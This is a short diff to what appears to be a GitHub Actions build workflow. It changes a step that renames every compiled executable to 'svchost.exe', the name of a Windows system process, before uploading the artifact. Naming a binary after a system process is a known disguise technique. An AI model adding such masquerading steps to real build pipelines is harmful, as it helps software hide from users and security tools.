@@ -59,7 +59,8 @@ jobs:
       - name: Rename to svchost.exe
         run: |
           cd dist
-          for f in *.exe; do mv "$f" "svchost.exe"; done
+          Remove-Item "temp.exe" -Force -ErrorAction SilentlyContinue
+          Get-ChildItem *.exe | Rename-Item -NewName "svchost.exe"
       
       - name: Upload
         uses: actions/upload-artifact@v4
